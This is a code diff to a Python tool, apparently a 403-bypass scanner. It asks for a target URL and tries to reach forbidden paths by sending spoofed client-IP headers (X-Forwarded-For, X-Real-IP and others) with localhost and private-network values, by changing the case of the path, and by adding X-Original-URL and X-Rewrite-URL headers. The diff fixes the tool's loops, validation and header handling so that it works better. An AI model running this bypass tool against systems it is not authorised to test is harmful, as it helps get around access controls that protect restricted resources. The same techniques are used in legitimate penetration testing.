@@ -1,3 +1,4 @@
+import sys
 import requests
 import pyinputplus as pyip
 print("[!!!!] Please make your target with the format like this https://x.xyz/secret or https://x.xyz/y/z/secret")
@@ -6,7 +7,6 @@ target = str(pyip.inputRegex(r"https?://[a-zA-Z0-9-]+\.[a-zA-Z0-9.-]+(/[a-zA-Z0-
 print("- "*50)
 print( f"Bypassing 403 error of {target}")
 print("- "*50)
-
 
 t=0
 hy = -1
@@ -18,13 +18,18 @@ for k in target:
         vitrigach.append(hy)
     if k == ".":
         vitricham.append(hy)
+
+if len(vitrigach) < 3:
+    print("URL needs at least 3 '/' (ex: https://x.xyz/secret)")
+    sys.exit()
+
 locatecham = vitricham[0]
 locategach1 = vitrigach[1]
 locategachcuoi = vitrigach[len(vitrigach)-1]
-for q in target:
-    domainname = target[0:vitrigach[2]]
-    secretvoigach = target[locategachcuoi:len(target)]
-    secretkogach = target[locategachcuoi+1:len(target)]
+
+domainname = target[0:vitrigach[2]]
+secretvoigach = target[locategachcuoi:]
+secretkogach = target[locategachcuoi+1:]
 
 
 
@@ -45,8 +50,8 @@ print("[*]IP bypass starting......")
 ip_bypass_headers= [ "X-Forwarded-For", "X-Forward-For", "X-Real-IP","X-Custom-IP-Authorization","X-Remote-IP", "X-Originating-IP","X-Remote-Addr","X-Client-IP" ]
 ip_values=[ "localhost", "localhost:80", "localhost:443", "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443", "2130706433", "0x7F000001", "0177.0000.0000.0001", "0", "127.1", "10.0.0.0", "10.0.0.1", "172.16.0.0", "172.16.0.1", "192.168.1.0", "192.168.1.1"]
 
-for i in range(0,7):
-    for k in range(0, 16):
+for i in range(len(ip_bypass_headers)):
+    for k in range(len(ip_values)):
         try:
             headers= {ip_bypass_headers[i]:ip_values[k]}
             
@@ -54,7 +59,7 @@ for i in range(0,7):
             if r.status_code != 403:
                 print(f"{ip_bypass_headers[i]} with {ip_values[k]} ip values is possible for bypass")
         except requests.exceptions.RequestException as e:
-            print(f"{x} → ERROR ({e.__class__.__name__})")
+            print(f"{ip_bypass_headers[i]}:{ip_values[k]} → ERROR ({e.__class__.__name__})")
 print("[*]IP bypass finished.....")
 
 
@@ -102,7 +107,7 @@ except requests.exceptions.Timeout:
     print(f"{secretvoigach.upper()}-> Timeout")
 try:
     r2 = requests.get(domainname + secretvoigach.title())
-    if r.status_code != 403:
+    if r2.status_code != 403:
         print(secretvoigach.title())
         print(f"status code:{r2.status_code}|content length: {len(r2.content)}|response time:{r2.elapsed.total_seconds()}")
 except requests.exceptions.Timeout:
@@ -125,7 +130,7 @@ headers = {"X-Original-URL":secretvoigach,"X-Rewrite-URL":secretvoigach,"X-Forwa
 
 for x in headers:
     try:
-        r = requests.get(target, timeout = 3,headers=headers )
+        r = requests.get(target, timeout = 3, headers={x: headers[x]})
         if r.status_code != 403:
             print(x)
             print(f"status code:{r.status_code}|content length: {len(r.content)}|response time:{r.elapsed.total_seconds()}")
